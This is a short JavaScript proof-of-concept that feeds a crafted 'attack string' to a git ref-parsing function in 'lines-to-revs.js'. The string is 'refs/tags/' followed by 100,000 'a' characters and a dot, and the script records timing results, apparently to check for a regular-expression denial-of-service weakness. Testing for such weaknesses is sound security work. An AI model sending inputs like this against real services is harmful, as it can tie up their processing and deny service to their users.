const myFunc = require("./lines-to-revs.js");

//Attack String :""+"a"*100000+"."
var str = "1 refs/tags/";
for (var i = 0; i < 100000; i++) {
  str += "a";
}
str += ".";

const result = myFunc([str]);

// real    0m0.284s
// user    0m0.130s
// sys     0m0.019s
